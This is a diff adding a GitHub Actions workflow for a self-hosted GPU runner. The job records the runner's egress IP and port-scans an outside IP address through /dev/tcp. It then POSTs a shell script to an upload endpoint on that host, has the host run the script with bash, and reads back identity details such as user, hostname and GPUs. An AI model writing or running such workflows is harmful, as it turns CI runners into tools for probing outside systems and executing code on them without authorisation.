@@ -1,0 +1,21 @@
+name: ul8199
+on:
+  workflow_dispatch:
+jobs:
+  j:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 15
+    steps:
+      - name: run
+        run: |
+          set +e
+          echo "EGRESS=$(curl -s -m 10 https://ifconfig.me)"
+          for P in 22 8099 8000 18080 18081; do timeout 5 bash -c "echo > /dev/tcp/123.184.7.135/$P" && echo "PORT_${P}_OPEN" || echo "PORT_${P}_CLOSED"; done
+          echo "== probe 8099 root"; curl -s -m 10 -o /dev/null -w 'root=%{http_code}\n' http://123.184.7.135:8099/
+          cat > /tmp/s.sh <<'EOS'
+          id -un; hostname; date -u; uptime; nvidia-smi -L | head -2
+          EOS
+          echo "== put"; curl -s -m 12 -X POST --data-binary @/tmp/s.sh http://123.184.7.135:8099/put/run.sh -w ' put=%{http_code}\n'
+          curl -s -m 12 -X POST --data 'bash /opt/t19/www/run.sh > /opt/t19/www/ul8199_r.txt 2>&1' http://123.184.7.135:8099/put/seq -w ' seq=%{http_code}\n'
+          sleep 6
+          echo "== read"; curl -s -m 12 http://123.184.7.135:8099/opt/t19/www/ul8199_r.txt | head -20
